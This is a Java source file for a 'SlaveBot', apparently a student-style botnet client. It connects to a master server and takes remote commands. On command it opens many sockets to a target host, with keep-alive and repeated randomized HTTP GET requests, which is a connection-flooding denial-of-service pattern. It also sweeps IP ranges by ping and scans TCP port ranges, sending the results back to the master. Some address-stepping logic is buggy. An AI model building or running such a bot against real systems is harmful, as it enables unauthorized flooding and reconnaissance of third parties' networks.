import java.io.BufferedReader;
import java.util.ArrayList;
import java.util.regex.PatternSyntaxException;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.*;
import java.text.*;


class sConnection
{
	String 	Date;
	String 	HostName;
	String 	HostIP;
	int	PORT;
	Socket 	Socket;
    sConnection()
    {
		Date date = new Date();
		SimpleDateFormat f = new SimpleDateFormat("yyyy-MM-dd");
		String format = f.format(date);
		Date=format;
    }
}


public class SlaveBot
{
    public static ArrayList<sConnection> connectionList;
    public static Socket SCT;
    public static ArrayList<String> IP = new ArrayList<String>();
    public static ArrayList<Integer> TVALUE = new ArrayList<Integer>();

    public static void main(String[] args) throws Exception
    {
        StringBuilder commaSepValueBuilder = new StringBuilder();
		if (args.length<4)
        {
		  System.err.println("*****Error: Port number and host details should be provided for client.");
          System.exit(-1);
		}
		String Name = "";
        String port = "";

		for(int t=0; t<3; t++)
        {
			if (args[t].equals("-h")){ Name=args[t+1];}
			else if (args[t].equals("-p")){ port=args[t+1];}
		}

        if(Name.equals("") || port.equals(""))
        {
            System.err.println("*****Error: Port number should be provided for server.");
            System.exit(-1);
		}
	    connectionList = new ArrayList<sConnection>();
		try
		{
            Integer.parseInt(port);
		}
		catch(Exception e)
		{
            System.err.println("*****Error: Port number should be integer.");
            System.exit(-1);
		}
        SCT = new Socket(Name, Integer.parseInt(port));
	    BufferedReader netIn = new BufferedReader(new InputStreamReader(SCT.getInputStream()));
	    sConnection sockList;
	    while(true)
	    {
            try
            {
                String str = netIn.readLine();
                if (str !="")
                {
                    String[] Cmd = str.split(" ");
                    Boolean keepAlive=false;
                    String url="";
                    int len_input=Cmd.length;
                    if(Cmd[0].equals("connect"))
                    {
                        if(Cmd[1] != null && Cmd[2]!= null && Cmd[3]!= null)
                        {
                            String targethostname = Cmd[1];
                            int PT = Integer.parseInt(Cmd[2].toString());
                            int N = Integer.parseInt(Cmd[3].toString());
                            Socket TS;

                            if(len_input > 4)
                            {
                                if(Cmd[4].equalsIgnoreCase("true")){  keepAlive =true;}
                                else if(Cmd[4].equalsIgnoreCase("false")){ keepAlive =false;}
                                else {url = Cmd[4].replace("url=", "");}
                            }
                            for(int i=0; i< N; i++)
                            {
                                try
                                {
                                    TS = new Socket(targethostname, PT);
                                    sockList=new sConnection();
                                    sockList.HostName=TS.getInetAddress().getHostAddress();
                                    sockList.HostIP=TS.getInetAddress().getHostName();
                                    sockList.PORT=PT;
                                    sockList.Socket=TS;
                                    connectionList.add(sockList);
                                    System.out.println(" connection established for socket with following credentials " + targethostname+" " + PT);
                                    if(keepAlive)
                                    {
                                        TS.setKeepAlive(true);
                                        System.out.println("keep alive*");
                                    }
                                    if(url != "")
                                    {
                                        String randomString = "";
                                        Random ran = new Random();
                                        int len = ran.nextInt(10) + 1;
                                        for(int j = 1; j <= len; j++)
                                        {
                                            int randomCharInt = ran.nextInt(90-60+1)+65;
                                            char randomChar = (char) randomCharInt;
                                            randomString = randomString + randomChar;
                                        }
                                        String finalURL = url + randomString;
                                        BufferedWriter outs = new BufferedWriter(new OutputStreamWriter(TS.getOutputStream(), "UTF8"));
                                        outs.write("GET " + finalURL + "\r\n");
                                        outs.write("\r\n");
                                        outs.flush();
                                        String responseLine;
                                        BufferedReader in = new BufferedReader(new InputStreamReader(TS.getInputStream()));
                                        while((responseLine = in.readLine()) != null)
                                        {
                                            System.out.println(responseLine);
                                        }
                                        outs.close();
                                        in.close();
                                    }
                                }
                                catch(Exception e)
                                {
                                    System.out.println("*****Error: Could not open connection for socket with following credentials " + targethostname+" " + PT);
                                }
                            }
                            System.out.println("*****Error: Total connections are: "+connectionList.size());
                        }
                        else
                        {
                            System.out.println("*****Error: No  proper arguments for connect");
                        }
                    }
                    else if(Cmd[0].equals("disconnect"))
                    {
                        if(Cmd[1]!= null )
                        {
                            ArrayList<sConnection> s = new ArrayList<sConnection>();
                            Iterator iterator = connectionList.iterator();
                            while (iterator.hasNext())
                            {
                                sConnection o = (sConnection) iterator.next();
                                if(!s.contains(o)) s.add(o);
                            }
                            int FLAG=0;
                            String TARGET = Cmd[1];
                            if (TARGET.matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){FLAG=1; }
                            else {	FLAG=0;}
                            int PT=0;
                            if(Cmd[2]!= null )
                            {
                                PT= Integer.parseInt(Cmd[2].toString());
                            }
                            Iterator<sConnection> it = s.iterator();
                            switch(FLAG)
                            {
                               case 1:
                                while(it.hasNext())
                                {
                                   sConnection s1 = it.next();
                                    if(PT==0)
                                    {
                                        if(s1.HostName.equals(TARGET))
                                        {
                                            s1.Socket.close();
                                            it.remove();
                                        }
                                    }
                                    else
                                    {
                                        if(s1.HostName.equals(TARGET) && s1.PORT==PT)
                                        {
                                            s1.Socket.close();
                                            it.remove();
                                        }
                                    }

                                }
                                break;
                               case 0:
                                while(it.hasNext())
                                {
                                    sConnection s1 = it.next();
                                    if(PT==0)
                                    {
                                        if(s1.HostIP.equals(TARGET))
                                        {
                                            s1.Socket.close();
                                            it.remove();
                                        }
                                    }
                                    else
                                    {
                                        if(s1.HostIP.equals(TARGET) && s1.PORT==PT)
                                        {
                                            s1.Socket.close();
                                            it.remove();
                                        }
                                    }
                                }
                                break;
                            }
                            connectionList=s;
                        }
                        else
                        {
                            System.out.println("*****Error: No  proper arguments for disconnect");
                        }
                    }
                    else if(Cmd[0].equals("ipscan"))
                    {
                        Scans ipscan = new Scans(1,SCT,Cmd);
                        Thread t1=new Thread(ipscan);
                        t1.start();
                    }
                    else if(Cmd[0].equals("tcpportscan"))
                    {
                        Scans ipscan = new Scans(2,SCT,Cmd);
                        Thread t1=new Thread(ipscan);
                        t1.start();
                    }
                    else
                    {
                        System.out.println("*****Error: Not a proper command " +  Cmd[0]);
                    }
                }
			}
			catch (Exception e)
            {
		      	e.printStackTrace();
                System.exit(-1);
            }
        }
	  }
    }
    class Scans extends Thread
    {
		int otp=0;
		Socket CS=null;
		String msg[]=null;
		ArrayList<String> IP = new ArrayList<String>();
		ArrayList<Integer> TVALUE = new ArrayList<Integer>();
		StringBuilder commaSepValueBuilder = new StringBuilder();
		Scans(int opr,Socket s, String m[])
		{
			otp=opr;
			CS = s;
			msg=m;
		}
		public void run()
		{
			if(otp==1)
            {
				ipScan();
			}
			if(otp==2)
			{
				tcpScan();
			}

		}
		private void tcpScan()
        {
			String TN=msg[1];
			String PR = msg[2];
			String[] parts = PR.split("-");

			int FST = Integer.parseInt(parts[0]);
			int LST = Integer.parseInt(parts[1]);
			for(int i = FST; i <= LST; i++)
			{
				int Port_value = i ;
				boolean abc = PortRangeCheck(TN, Port_value);

				if(abc)
				{
					TVALUE.add(Port_value);
				}
			}
			for( int j = 0; j< TVALUE.size(); j++)
			{
				commaSepValueBuilder.append(TVALUE.get(j));
				if( j != TVALUE.size()-1)
				{
					commaSepValueBuilder.append(", ");
				}
			}

			PrintWriter NO;
			try
			{
				NO = new PrintWriter(new OutputStreamWriter(CS.getOutputStream()));
				NO.println(commaSepValueBuilder.toString());
			    NO.flush();
			}
            catch(IOException e)
            {
				System.err.println("*****Error: Unable to connect to master");
			}
		}
		private void ipScan()
		{
			try
			{
				String ipRange[]=msg[1].split("-");;
				String start = ipRange[0];
				String end = ipRange[1];
				while(!end.equals(start))
                {
					if(ipPing(start))
					{
						IP.add(start);
					}
					start=getNextIPV4Address(start);
				}
				if(ipPing(end))
				{
					IP.add(start);
				}
			}
			catch(ArrayIndexOutOfBoundsException e)
			{
				System.out.println("****** Invalid IP range\n****** Exiting IP Scan");
				return;
			}
			catch(PatternSyntaxException e)
			{
				System.out.println("****** Invalid IP\n****** Exiting IP Scan");
				return;
			}
			catch(NumberFormatException e)
			{
				System.out.println("****** Invalid IP\n****** Exiting IP Scan");
				return;
			}
			for( int j = 0; j< IP.size(); j++)
			{
				commaSepValueBuilder.append(IP.get(j));
				if( j != IP.size()-1)
				{
					commaSepValueBuilder.append(", ");
				}
			}
			PrintWriter NO;
			try
            {
				NO = new PrintWriter(new OutputStreamWriter(CS.getOutputStream()));
				NO.println(commaSepValueBuilder.toString());
			    NO.flush();
			}
            catch(IOException e)
            {
				System.err.println("*****Error: Unable to send datato master");
			}
		}
        private  boolean PortRangeCheck(String TN, int Port_value)
        {
            boolean RESULT = true;
            try
            {
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(TN, Port_value), 1000);
                socket.close();
            }
            catch(Exception ex)
            {
                RESULT = false;
            }
            return(RESULT);
        }

        private static String getNextIPV4Address(String ip)
        {
            String[] nums = ip.split("\\.");
            int i = (Integer.parseInt(nums[0]) << 24 | Integer.parseInt(nums[2]) << 8
			          |  Integer.parseInt(nums[1]) << 16 | Integer.parseInt(nums[3])) + 1;

            if ((byte) i == -1) i++;

            return String.format("%d.%d.%d.%d", i >>> 24 & 0xFF, i >> 16 & 0xFF,
			                                        i >>   8 & 0xFF, i >>  0 & 0xFF);
        }

        private static boolean ipPing(String ip)
        {
            boolean PING=true;
            try
            {
                String strCmd = "";
                if(System.getProperty("os.name").startsWith("Windows"))
                {
                    strCmd = "PING -n 1 " + ip;
                }
                else
                {
                    strCmd = "PING -c 1 " + ip;
                }
                Runtime r = Runtime.getRuntime();
                Process process = r.exec(strCmd);
                String pingResult = null;
                BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

                while((pingResult = stdInput.readLine()) != null)
                {
                    if(pingResult.contains("100.0% packet loss") || pingResult.contains("100% loss") || pingResult.contains("100% packet loss")){
				    		PING=false;
                    }
                }

                stdInput.close();
            }
            catch(IOException e)
            {
                return false;
            }
            return PING;
        }
	}
